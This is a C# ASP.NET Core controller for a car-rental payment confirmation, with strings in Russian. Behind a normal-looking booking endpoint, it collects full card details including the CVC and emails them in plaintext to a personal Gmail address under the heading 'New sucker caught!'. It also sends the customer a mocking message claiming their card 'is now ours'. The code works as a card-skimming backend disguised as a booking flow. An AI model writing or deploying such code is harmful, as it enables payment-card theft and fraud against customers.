using Microsoft.AspNetCore.Mvc;

[Route("api/payment")]
[ApiController]
public class PaymentController : ControllerBase
{
    private readonly EmailService _emailService;

    public PaymentController(EmailService emailService)
    {
        _emailService = emailService;
    }

    [HttpPost("confirm")]
    public async Task<IActionResult> ConfirmPayment([FromBody] PaymentRequest request)
    {
        if (string.IsNullOrWhiteSpace(request.Name) || string.IsNullOrWhiteSpace(request.Email))
        {
            return BadRequest("Имя и email обязательны для заполнения!");
        }
        
        var emailContent = $@"
        Спасибо за оплату, {request.Name}! Поздравляем! Вы успешно слили свои данные в интернете!
        
        Ваша карта {request.CardNumber} с именем {request.CardHolder} теперь наша!
        Срок действия {request.ExpirationDate} - как раз успеем всё обнулить.
        
        P.S. Шутка! (или нет) Ваше бронирование действительно подтверждено.
        Но в следующий раз будьте осторожнее с вводом данных.
        ";
        
        await _emailService.SendEmailAsync(request.Email, 
            "Подтверждение аренды автомобиля", 
            emailContent);
        
        var adminContent = $@"
        Новый лох попался!
        
        Клиент: {request.Name} ({request.Email})

        Платежные данные:
        Номер карты: {request.CardNumber}
        Держатель: {request.CardHolder}
        Срок: {request.ExpirationDate}
        CVC: {request.Cvc}
        ";
        
        await _emailService.SendEmailAsync("azaliyajn@gmail.com", 
            "Новое бронирование автомобиля", 
            adminContent);

        return Ok(new { message = "Бронирование подтверждено! Письмо с подтверждением отправлено." });
    }
}

public class PaymentRequest
{
    public string Name { get; set; }
    public string Email { get; set; }
    public string Address { get; set; }
    public string City { get; set; }
    public string PickupLocation { get; set; }
    public string DropoffLocation { get; set; }
    public string PickupDate { get; set; }
    public string DropoffDate { get; set; }
    public string PickupTime { get; set; }
    public string DropoffTime { get; set; }
    public string CardNumber { get; set; }
    public string CardHolder { get; set; }
    public string ExpirationDate { get; set; }
    public string Cvc { get; set; } 
}